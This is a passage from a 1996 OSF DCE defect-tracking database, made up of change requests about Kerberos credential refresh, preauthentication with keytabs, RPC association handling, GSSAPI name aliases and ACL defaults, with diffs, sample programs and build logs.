creds are refreshed or the binding handle is freed.

This delta also fixes a problem where the old credentials were freed
before new credentials were obtained in get_tkt, so there was a window
where the binding handle could contain a NULL creds pointer.
rpc__krb_get_tkt was changed to use a temporary variable to obtain the
new credentials, and only free the old credentials when new credentials
were available. This eliminated a core dump in rpc__cn_call_start
if a refresh started between the time the caller checked the creds
and the time the caller allocated the association.



CR Number                     : 13478
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : unknown
Subcomponent Name             : unknown
Short Description             : test
Reported Date                 : 5/23/96
Found in Baseline             : 1.2
Found Date                    : 5/23/96
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : osf
Diff release                  : 1.1
Sensitivity                   : public

[5/23/96 public]



CR Number                     : 13477
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : unknown
Subcomponent Name             : unknown
Short Description             : test
Reported Date                 : 5/23/96
Found in Baseline             : 1.1
Found Date                    : 5/23/96
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/23/96 public]

Test.



CR Number                     : 13475
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : preauth and keytab files don't work together
Reported Date                 : 5/21/96
Found in Baseline             : 1.1
Found Date                    : 5/21/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : security/client/login/sec_login_pvt.c
Diff supplied by              : osf
Diff release                  : 1.1
Sensitivity                   : public

[5/21/96 public]
If a principal is given a pre_auth_req attribute with value 2, then
the following program fails at the sec_login_validate_identity call
with "Invalid password". With a value of 0, the validate succeeds.
dce_login succeeds in either case. The program is as follows:

int main(int argc, char *argv[])
{
    char                *user   = NULL;
    boolean32           reset_passwd, valid;
    sec_login_auth_src_t auth_src;
    sec_login_handle_t  lcontext;
    error_status_t      st;
    void		*prec;

    user=argv[1];
    if (sec_login_setup_identity((unsigned_char_p_t) user,
				 sec_login_no_flags,
				 &lcontext, 
				 &st)) {

      sec_key_mgmt_get_key(rpc_c_authn_dce_secret, (unsigned char *)
"FILE:/tmp/keytab.file",
			   user,
			   0,	/* return most recent version */
			   &prec, 
			   &st);

      valid = sec_login_validate_identity(lcontext,
					  prec,
					  &reset_passwd,
					  &auth_src,
					  &st);
    }
}

The difference between dce_login and this program is that the key type
of the key retrieved from the keytab file is sec_passwd_des, whereas in
dce_login, it is sec_passwd_plain.

Tracing the  code uncovers the following in 
sec_login_pvt_get_and_process_krb_tgt() which is called from
sec_login_validate_identity():

    while (retries_left-- && lcp->auth_src == sec_login_auth_src_network) {

        /* get TGT */
        *stp = krb5_do_as_request(KRB_REQUEST_INFO(lcp)->options,
                                  KRB_REQUEST_INFO(lcp)->addrs,
                                  patype,
                                  ETYPE_DES_CBC_CRC,
                                  KEYTYPE_DES,
                                  skey_keyproc,
                                  &ukey,
                                  &KRB_REQUEST_INFO(lcp)->nonce,
                                  &KRB_REQUEST_INFO(lcp)->creds,
                                  &KRB_REQUEST_INFO(lcp)->reply,
                                  &etext,
                                  &reply_random_key);
        if (GOOD_STATUS(stp) || 
            !STATUS_EQUAL(stp, KRB5KDC_PREAUTH_FAILED) || 
            !retries_left ||
	    etext == NULL ||
            (PASSWD_TYPE(key) != sec_passwd_plain)) {

            break;
        }

	...

where it is not clear why we break if the passwd_type is not plain.

[6/05/96]

Given a plain text password, sec_login_validate_identity transforms the password 
into a DES type password before proceeding with the validation. As noted above,
passwords are stored in key tables as DES type passwords and accordingly no 
transformation is necessary. 

sec_login_validate_identity makes a call to sec_login_pvt_get_preauth. One argument
to this call is the user password. In the original code, the form of the user
password (transformed or untransformed) was contigent on whether or not the 
preathentication subtype was OSF_DCE_THIRD_PARTY. sec_login_pvt_get_preauth requires
a password of DES type, since the preauth subtype has no bearing on whether or not
the user key needed to be transformed, an incorrect type of password could be passed.
The proposed solution makes the user password argument of the call to sec_login_pvt_get_preauth
contigent on whether the original key type required transformation to DES.

The proposed fix was tested at OSF on an HP system running OSF maint release
of DCE 1.1. It resolved the reported problem.

Comment: this fix should also take care of the path through sec_login_valid_and_cert_ident
         since it also leads to sec_login_pvt_get_and_process_krb_tgt.

***************
*** 6332,6338 ****
              cleanup_key(reply_random_key);
              *stp = sec_login_pvt_get_preauth(pa_subtype,
                           KRB_REQUEST_INFO(lcp)->creds.client,
!                          (pa_subtype == OSF_DCE_THIRD_PARTY) ? &user_key : key,
                           &reply_random_key, &padata);
              if (*stp == KRB5_PREAUTH_FAILED) {
                  /* fallback to KRB5_PADATA_ENC_UNIX_TIME */
--- 6329,6335 ----
              cleanup_key(reply_random_key);
              *stp = sec_login_pvt_get_preauth(pa_subtype,
                           KRB_REQUEST_INFO(lcp)->creds.client,
!                          (PASSWD_TYPE(key) == sec_passwd_plain) ? &user_key : key,
                           &reply_random_key, &padata);
              if (*stp == KRB5_PREAUTH_FAILED) {
                  /* fallback to KRB5_PADATA_ENC_UNIX_TIME */

[06/05/96 public]

This fix will break the OSF_DCE_THIRD_PARTY_PLAINTEXT preauth type. THis
is a preauthentication protocol which preserves the plaintext portion of
the user's password.  It can be very useful for the security server to
check against other password databases, etc. Only the client side was implemented
for DCE 1.1 so it is currently undocumented. However, I would rather not break
this in case we decide to add this server functionality in th future.

Anyway the fix is basically:

If PASSWD_TYPE(key) == sec_passwd_plain AND pa_subtype != 
	OSF_DCE_THIRD_PARTY_PLAINTEXT, always pass key to sec_login_pvt_get_preath().
Else, pass user_key.

Or:

--- 6329,6335 ----
              cleanup_key(reply_random_key);
              *stp = sec_login_pvt_get_preauth(pa_subtype,
                           KRB_REQUEST_INFO(lcp)->creds.client,
!                          (PASSWD_TYPE(key) == sec_passwd_plain &&
!			    pa_subtype != OSF_DCE_THIRD_PARTY_PLAINTEXT) ? &user_key : key,
                           &reply_random_key, &padata);
              if (*stp == KRB5_PREAUTH_FAILED) {
                  /* fallback to KRB5_PADATA_ENC_UNIX_TIME */

[06/05/96 public]

Oops, typo above. That should be:

If PASSWD_TYPE(key) == sec_passwd_plain AND pa_subtype !=
        OSF_DCE_THIRD_PARTY_PLAINTEXT, always pass user_key to sec_login_pvt_get_preath().
Else, pass key.



CR Number                     : 13474
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : 
Short Description             : dced_object_read_all fails
Reported Date                 : 5/17/96
Found in Baseline             : 1.1
Found Date                    : 5/17/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/17/96 public]

When using the dced_object_read_all the call fails.  This is because there are hostdata
objects that do not have storage files associated with it.  For example there are objects
for the dfs cache info, group override, and password override.  There are no files associated
with this (except for DFS cache, if DFS is configured).  I would think that the information
that could be retrieved would be returned instead of just failing and returning nothing.



CR Number                     : 13473
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : Association shutdown errors
Reported Date                 : 5/13/96
Found in Baseline             : 1.1
Found Date                    : 5/13/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/15/96 public]
While toubleshooting a connection oriented RPC problem, a test
program reported several Association shutdown errors. These messages
were generated when the client tried to use an association that the
server was trying to shut down. When the client received the shutdown
request, the Association shutdown error was returned to the client
process. When the client tried the call again it was successful.

There should be some code to either keep the association open
long enough for one last RPC call or to try the RPC call again
on a different association.



>>program reported several Association shutdown errors. These messages
>>were generated when the client tried to use an association that the
>>server was trying to shut down. When the client received the shutdown
>>request, the Association shutdown error was returned to the client
>>process. When the client tried the call again it was successful.

I think I understand that you are describing a test scenario in which:

1. The first RPC from a client to a server has been successful, producing
   a subsequent *inactive* client/server association.

2. The server's reclaim thread has detected:
	a. inactive <no call in progress> association
	b. no network traffic over association for <window> period
 	c. no active context handle on association
   The server's reclaim thread sends an 'advisory' shutdown
   request message, (e.g., we have detected the above conditions,
   we recommend that you the client shutdown this association if
   you don't wish to reuse it for another RPC).
3. The client did not (for his/her own reason) choose to shutdown
   this association.
4. The server's reclaim thread has again been activated - after
   a second <window> has elapsed.  It detected that the conditions
   in (2.) *still* exist.  It begins to reclaim the association.
   The server simply closes the underlying connection.  The only
   warning which the client will receive,  (after all, he has
   alaready been advised, by means of the RPC's prescribed protocol),
   is a signal, produced on the client side that an association's
   connection has been broken.
5. Now, finally the client decides to send another RPC.  Client's
   first try to find an inactive association which is already setup
   to the destination in the binding.  If it isn't able to find one,
   it simply sets up another one.  This seems to be what is happening
   here.  Another association is setup to the server and the RPC
   proceeds normally and succeeds.

I assume that you know that the things which you describe are happening
because you have RPC_DEBUG enabled.  I also assume that the client is
reporting that a "association shutdown" is in progress as a function of
it going ahead and setting up another association.

This all seems fairly normal from your description.  Do you have other
info. which might provide further detail?

Thanks

Bob



CR Number                     : 13471
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : server deadlocks refreshing credentials
Reported Date                 : 5/7/96
Found in Baseline             : 1.1
Found Date                    : 6/28/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : cncall.c com.h combind.h combind.c krbclt.c krbdgclt.c rpctimer.c
Sensitivity                   : public

[5/9/96 public]

This problem was discovered by a customer with an Encina client that
was hanging accasionally in rpc__cn_call_start. The problem was caused
by a lack of exception handlers in the kerberos routines that refresh
binding credentials. If a cancel was raised while the credentials were
getting refreshed, the exception would interrupt a pthread_cond_wait
and the credentials would never get unlocked.
 
While trying to reproduce this bug, I get a couple of segmentation
violations when one thread tried to use a credential that
another thread was trying to refresh. Seperate locks are used to
control access to the binding handle and the kerberos information.
There were places where a thread could end up trying to start an RPC
call with a NULL pointer for its kerberos information.
 
I also noticed that the rpc timer thread getting starved when
alot (8) of connection-oriented RPC clients were running at the
same time.

The fix for the original problem was to add exception handlers around
the calls to pthread_cond_wait in the krb routines to unlock the
mutex if the thread was cancelled. To control access to the binding
handles, I added a flag to indicate when a refresh was pending, so
a thread could make sure it had a valid credential before starting
an RPC call.

I bumped the priority of the rpc timer thread to PRI_OTHER_MAX to make
sure it got scheduled.

These changes were incorporated into the DCE 1.1 source in
Transarc delta hyer-17575-deadlock-in-krb.

Bob Hyer
Transarc DCE/DFS Devlopment
bob_hyer@transarc.com



CR Number                     : 13458
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : rgy
Short Description             : default acls make names public
Reported Date                 : 4/30/96
Found in Baseline             : 1.1
Found Date                    : 4/30/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/30/96 public]
A note on cypherpunks got me thinking...

> I'm still reasonably serious about that "Hack Stanford Privacy" thing. If
> there is an easy way for outsiders to glean our whole kerberos namespace
> (outside of other major universities interconnected via AFS, and we'll
> get that fixed Real Soon Now), I want to know about it.

So, what are the default ACLs on the registry?  Can anyone do a
dcecp "principal catalog" command or it's C code equivalent?

	dcecp> acl show -ic /.:/sec/principal 
	{unauthenticated r-----}
	{user cell_admin rcidDn}
	{group acct-admin rcidDn}
	{other_obj r-----}
	{any_other r-----}

Hmmm, it looks like anyone can.  The required permission to see any 
particular pgo is r on that pgo item.  Would anything break if principals
weren't readable?  I know that acl editing could display uuids instead
of names.

I'm not sure what the right thing is.  Many companies guard their org 
charts and their /etc/passwd files.  How much info is leaking by allowing
principal info out?  Would companies care?  Should we change the default
configuration?



CR Number                     : 13447
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : gssapi
Short Description             : Support X/Open API
Reported Date                 : 4/24/96
Found in Baseline             : 1.2.1
Found Date                    : 4/24/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 1.1maint
Affected File(s)              : src/security/gssapi/gssapi.[ch]
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[4/24/96 public]

The X/Open version of GSSAPI renames some functions.  We should support
those names.  That was never a requirement, so this is an enhnacement.
But V2 of the IETF GSSAPI will follow the X/Open names, so once that
becomes an official IETF standards document, this should be changed
to a defect. :)

[04/30/96 public]
Here is a set of untested changes.  To gssapi.h add the following:
	OM_uint32 gss_get_mic
			 (OM_uint32*,       /* minor_status */
			  gss_ctx_id_t,     /* context_handle */
			  int,              /* qop_req */
			  gss_buffer_t,     /* message_buffer */
			  gss_buffer_t      /* message_token */
			 );

	OM_uint32 gss_verify_mic
			 (OM_uint32*,       /* minor_status */
			  gss_ctx_id_t,     /* context_handle */
			  gss_buffer_t,     /* message_buffer */
			  gss_buffer_t,     /* token_buffer */
			  int*              /* qop_state */
			 );

	OM_uint32 gss_wrap
			 (OM_uint32*,       /* minor_status */
			  gss_ctx_id_t,     /* context_handle */
			  int,              /* conf_req_flag */
			  int,              /* qop_req */
			  gss_buffer_t,     /* input_message_buffer */
			  int*,             /* conf_state */
			  gss_buffer_t      /* output_message_buffer */
			 );

	OM_uint32 gss_unwrap
			 (OM_uint32*,       /* minor_status */
			  gss_ctx_id_t,     /* context_handle */
			  gss_buffer_t,     /* input_message_buffer */
			  gss_buffer_t,     /* output_message_buffer */
			  int*,             /* conf_state */
			  int*              /* qop_state */
			 );
To gssapi.c add the following:
	OM_uint32 gss_verify_mic
			 (OM_uint32* minor_status,
			  gss_ctx_id_t context_handle,
			  gss_buffer_t message_buffer,
			  gss_buffer_t token_buffer,
			  int* qop_state) {
		return gss_verify(minor_status, context_handle, message_buffer,
			token_buffer, qop_state);
	}

	OM_uint32 gss_wrap
			 (OM_uint32* minor_status,
			  gss_ctx_id_t context_handle,
			  int conf_req_flag,
			  int qop_req,
			  gss_buffer_t message_buffer,
			  int* conf_state,
			  gss_buffer_t token_buffer) {
		return gss_seal(minor_status, context_handle, conf_req_flag,
			qop_req, message_buffer, conf_state, token_buffer);
	}

	OM_uint32 gss_unwrap
			 (OM_uint32* minor_status,
			  gss_ctx_id_t context_handle,
			  gss_buffer_t token_buffer,
			  gss_buffer_t message_buffer,
			  int* conf_state,
			  int* qop_state) {
		return gss_unwrap(minor_status, context_handle, token_buffer,
			message_buffer, conf_state, qop_state);
	}

[04/30/96 public]

A couple of small corrections (eye-balled but still untested).

The changes in gssapi.c need a definition for gss_get_mic (which, from the
looks of it is the new name of gss_sign):

	OM_uint32 gss_get_mic
			 (OM_uint32* minor_status,
			  gss_ctx_id_t context_handle,
			  int qop_req,
			  gss_buffer_t message_buffer,
			  gss_buffer_t message_token
			 ) {
		return gss_sign(minor_status, context_handle, qop_req,
			message_buffer, message_token);
	}

Also the definition of gss_unwrap should call gss_unseal not gss_unwrap.



CR Number                     : 13446
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : 
Short Description             : can't build w/o debug option
Reported Date                 : 4/23/96
Found in Baseline             : 1.1
Found Date                    : 4/23/96
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/23/96 public]

This OT is being created for Tsuneo Yamaura of Hitachi:

 --------------------------------  OT  -------------------------------------

            To maximize the performance of DCE 1.2.1, we followed the
     instructions mentioned in "4.8 Build Options for Improving DCE
     Performance" on page 4-17 of Release Notes, and tried to build DCE
     1.2.1 *without* debug option to have ended up with a compilation
     error listed in the appendix 01 below.

            The Appendix 02 shows the module that causes the compilation
     error.  The cause of this error is quite simple: RPC__SVC_DBG_MSG_SZ
     and RPC__SVC_DBG_LEVEL used in the module are placed inside the
     "#ifdef DEBUG" in rpcsvc.h, and the definitions of RPC__SVC_DBG_MSG_SZ
     and RPC__SVC_DBG_LEVEL disappear when the debug option is set.

            As a temporary remedy, we commented out RPC__SVC_DBG_MSG_SZ
     and RPC__SVC_DBG_LEVEL to kill the compilation error, and we continued
     the system building.
                                                     Tsuneo Yamaura


     PS: We also found that the same error exists in DCE 1.1.


------------------------------------------------------------------------
-------------------------   appendix 01   ------------------------------
-------------------------  error message  ------------------------------
------------------------------------------------------------------------

xlc -c     -O  -DNCK -DPROT_NCADG -DPROT_NCACN  -DAUTH_KRB -DNAF_IP -DDN
S_CDS -DDNSPI_V3 -DDNS_V3API    -DDCE_RPC_SVC  -Dunix -D_ALL_SOURCE -DNO
_SIOCGIFADDR -D_BSD=44 -D_NONSTD_TYPES  -D_ALL_SOURCE -DAIX32   -I. -I/o
pt2/dce12_src/project/dce/build/dce1.2/src/rpc/runtime  -IRIOS -I/opt2/d
ce12_src/project/dce/build/dce1.2/src/rpc/runtime/RIOS -I/opt2/dce12_src
/project/dce/build/dce1.2/export/rios/usr/include -I/opt2/dce12_src/proj
ect/dce/build/dce1.2/external/rios/usr/include  /opt2/dce12_src/project/
dce/build/dce1.2/src/rpc/runtime/rpcsvc.c
"/opt2/dce12_src/project/dce/build/dce1.2/src/rpc/runtime/rpcsvc.c", lin
e 73.14: 1506-045 (S) Undeclared identifier RPC__SVC_DBG_MSG_SZ.
*** Error code 1
`build_all' not remade because of errors.
*** Error code 1
`build_all' not remade because of errors.
*** Error code 1
`build_all' not remade because of errors.
*** Error code 1
`build_all' not remade because of errors.





------------------------------------------------------------------------
-------------------------   appendix 02   ------------------------------
---------------  source code of the erroneous module  ------------------
------------------------------------------------------------------------

PRIVATE int rpc__svc_eprintf ( char *fmt, ... )
{
                     :
                     :
    char        buf[RPC__SVC_DBG_MSG_SZ];     <------------------------- line 73
    va_list     arg_ptr;

    va_start (arg_ptr, fmt);
    vsprintf (buf, fmt, arg_ptr);
    va_end (arg_ptr);
    DCE_SVC_DEBUG((RPC__SVC_HANDLE, rpc_svc_general, RPC__SVC_DBG_LEVEL <-- l.79
    (0), buf));
    return(0);
}



CR Number                     : 13445
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 11664
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : 
Short Description             : recordLock ext fields undefined
Reported Date                 : 4/23/96
Found in Baseline             : 1.1
Found Date                    : 4/23/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/23/96 public]
Two spare fields in afsRecordLock were converted for use as the high 32
bits of the l_start_pos and l_end_pos by OT 11664.  However, these new
fields were not used by 32 bit systems and also were never being
initialized to zero.  This caused 64bit systems to find garbage in
these fields which lead to problems when revoking lock tokens.



CR Number                     : 13442
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : cn
Short Description             : CN runtime doesn't scale.
Reported Date                 : 4/19/96
Found in Baseline             : 1.0
Found Date                    : 4/19/96
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/19/96 public]

CN runtime is thread hungry. Each association (TCP/IP connection) requires
a dedicated receiver thread. Because of the association caching, the number
of threads (and the open sockets), can be larger than the concurrency
level, i.e., # of call executor threads + max call queue length. Also,
since a client context is maintained by an open socket (per a client
process), it consumes more receiver threads while the context handles are
in-use. We had the customer report of rpcd coredump with over 400 receiver
threads, roughly 40MB of VM on HP-UX. (We tell customers get more swap
spaces, adjust the kernel parameters, etc. ;) It should use one or two
(client/server) receiver threads handling all connections.

Another bad coding in CN runtime is its use of the rpc global mutex.
Basically, any thread which is executing in CN runtime, including the
receiver thread!, holds the rpc global mutex. (It releases it when making
blocking calls, though.) It causes the unfair thread scheduling because if
the thread is holding the rpc global mutex when the time-slice expires, it
will be likely scheduled again blocking other rpc threads, including DG
runtime's threads. It should use smaller locking, e.g., per resources, like
DG runtime.

Fixing the above problems requires substantial reworks of CN runtime
implementation. (Why such an implementation was done in the first place?)



CR Number                     : 13441
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : cn
Short Description             : Multi-threaded CN client may lose the context handle.
Reported Date                 : 4/19/96
Found in Baseline             : 1.0
Found Date                    : 4/19/96
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/19/96 public]

This is really an architectural defect and the CN protocol specification
needs to be revised to fix it.

The CN runtime maintains the context handle by keeping at least one
association (e.g., TCP/IP connection) open. If there are multiple
associations open between the client and the server, typically the server
chooses which association to leave open. This is because the association
cache timeout is shorter in the server, i.e., 10 seconds
(TIMEOUT_SERVER_DISCONNECT in Appendix K of AES). In the OSF implementaion,
the timeouts are defined in cnassoc.c:

/*
 * The client idle connection disconnect time in seconds.
 * This value is specified in Appendix A of the NCA connection
 * architecture spec. 
 */
#define RPC_C_ASSOC_CLIENT_DISC_TIMER           300

/*
 * The server idle connection disconnect time in seconds.
 * This value is specified in Appendix A of the NCA connection
 * architecture spec. 
 */
#define RPC_C_ASSOC_SERVER_DISC_TIMER           10

However, as I understand it, caching is not mandatory. It is perfectly
legal to close the association before the timeout if resources are scarce,
as long as you satisfy the context handle's requirement, i.e., keep one
open if there is an active context(s). The problem arise when both ends
ramdomly pick which associations to close. For instance, given 3
associations, assoc1, assoc2 and assoc3, the client may close assoc1 and
assoc2 and the server may close assoc1 and assoc3 which leaves no
association at all. Well, it's extremely difficult to produce such a case,
but it's possible. (You can never predict the impact of network delays,
etc.) There should be the protocol defined negotiation to choose which
associaton to leave open.



CR Number                     : 13433
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : keymgmt
Short Description             : sec_key_mgmt_change_key can leave keytab file out of sync
Reported Date                 : 4/18/96
Found in Baseline             : 1.1
Found Date                    : 4/18/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/client/key_mgmt/keymgmt.c
Sensitivity                   : public
Transarc Deltas               : cox-17734-rollback-keytab-if-rgy-change-fails
Transarc Status               : open

[4/18/96 public]
If sec_key_mgmt_change_key is called with a specific kvno while the
rgy is in maintenance mode, the sec_rgy_acct_passwd call would fail.
However, the new key would be entered into the keytab file, causing
the keytab file to be out of sync with the rgy.  The next time
sec_key_mgmt_change_key was called (with the same kvno, since the
previous update failed) it would fail saying that the requested kvno
already existed in the keytab.
(This problem doesn't manifest when you call with
sec_passwd_c_version_none, because in that case it will remove the
appropriate kvno before it starts.)
With this change, if the rgy update fails, roll back the addition of
the new key into the keytab file, to keep them in sync.
*** security/client/key_mgmt/keymgmt.c
--- 12.7	1996/04/16 20:07:49
***************
*** 361,370 ****
--- 373,399 ----
  
                      /* Set the key in the registry */
                      if (GOOD_STATUS(err)) {
+ 			/* In case sec_rgy_acct_passwd mucks with next_vno,
+ 			 * which it is entitled to do.
+ 			 */
+ 			unsigned32 n_kvno = next_vno;
+ 
                          sec_rgy_acct_passwd(rgy_h, &login_name, oldkey,
                                              (sec_passwd_rec_t *) keydata,
                                              sec_passwd_des, &next_vno, err);
                          sec_key_mgmt_free_key(oldkey, &lst);
+ 			if (BAD_STATUS(err)) {
+ 			    /* If setting the key in the rgy failed, remove
+ 			     * the key from the keytab also.  This is
+ 			     * guaranteed not to wipe out a key that was valid
+ 			     * before we were called, because if next_vno were
+ 			     * valid then, the sec_key_mgmt_set_key call above
+ 			     * would have failed.
+ 			     */
+ 			    sec_key_mgmt_delete_key(authn_service, arg,
+ 						    principal_name, n_kvno,
+ 						    &lst);
+ 			}
                      }
                  }
              } /* set_key succeeded */
Added field Transarc Deltas with value 
 `cox-17734-rollback-keytab-if-rgy-change-fails' 
Added field Transarc Status with value `open'



CR Number                     : 13432
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : 
Short Description             : dced dumps core if malloctype not set
Reported Date                 : 4/18/96
Found in Baseline             : 1.2.1
Found Date                    : 4/18/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/18/96 public]

This problem has been discussed at length, but I am not aware of
a defect report in the database to document it, so here goes.

dced dumps core after several hours on AIX 3.2.5 unless MALLOCTYPE is
set as described below. Below is an explanation from IBM:
 
-----------------------------------------------------
If you plan to run the OSF DCE 1.2.x reference platform code on AIX
3.2.5, you must export MALLOCTYPE=3.1 when you execute the code.
 
The reason for this is that the malloc algorithm changed from AIX 3.1 to
AIX 3.2. The malloc algorithm in AIX 3.1 returns a fresh, zero-
initialized space. DCE depends on this behavior. AIX 3.2 malloc does not
guarantee a zero-initialized space.
 
So, before you execute your DCE code on AIX 3.2.5, do the following:
 
export MALLOCTYPE=3.1
 
The procedure step will cause all applications to revert back to the old
malloc. Setting this variable to any other value will cause the new
malloc to be in effect.
----------------------------------------------------- -- Gerry Thome

I (biyani@transarc.com) was not able to discover a way to force malloc()
to return a zero-initialized space on other important unixes
like HP/UX 9, Solaris 2.3, Digital Unix 3.2, and AIX 4. Undoubtedly,
there are many other platforms that DCE 1.2.1 will be ported to.

If indeed there is no workaround on each of these platforms, this will
turn out to be a really severe problems as licensees attempt to
port DCED 1.2.1.

If you know of workarounds, please document them here.



CR Number                     : 13429
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : 
Short Description             : dced overwrites dce_acl* status withbogus 'sec_acl_invalid_permission'
Reported Date                 : 4/16/96
Found in Baseline             : 1.1
Found Date                    : 4/16/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/16/96 public]
The dced code makes calls to the dce_acl_is_client_authorized() API
and overwrites any error status returned from that routine.  Not
only does that hide any errors at the dce_acl* level, but the 
error status that dced overwrites real errors with is
'sec_acl_invalid_permission'.  This is misleading; based on the 
logic in dced at these access checks, the error status (if appropriate
to set one in the dced code at all) should be 'sec_acl_not_authorized'. 
(See sec.sams.)

See
src/admin/dced/server/misc.c (dced_authorized())
src/admin/dced/server/acls.c (dced_server_auth())



CR Number                     : 13427
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 6693
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : wrong ACL manger type for directory entries.
Reported Date                 : 4/5/96
Found in Baseline             : 1.1
Found Date                    : 4/5/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : directory/cds/server/cds_dacl.c
Diff supplied by              : provider
Diff release                  : 1.2.2
Sensitivity                   : public

[4/5/96 public]

The CDS ACL manager at 1.1 returns the wrong ACL manager type for directory
entries (in a CDS version 3.0 directory). Aside from the cosmetic problems
associated with this defect:

dcecp> rpcentry create /.:/tmp/e1
dcecp> acl perm /.:/tmp/e1 -e  
{r {Read entry attributes}}
{w {Update entry attributes}}
{d {Delete entry}}
{t {Test attribute values}}
{c {Change ACL}}
{i {Create new directory entries}}
{a {Administer directory replication}}

this causes more serious problems in an environment with mixed CDS servers
(e.g. 1.0.3 and 1.1) and replicated directories. For example (cross is a
1.0.3 CDS server, down a 1.1):

dcecp> dir show /.:/tmp
{RPC_ClassVersion {01 00}}
{CDS_CTS 1996-04-04-20:40:36.840172100/00-00-c0-35-71-47}
{CDS_UTS 1996-04-05-15:06:22.989320100/08-00-09-7a-b4-7e}
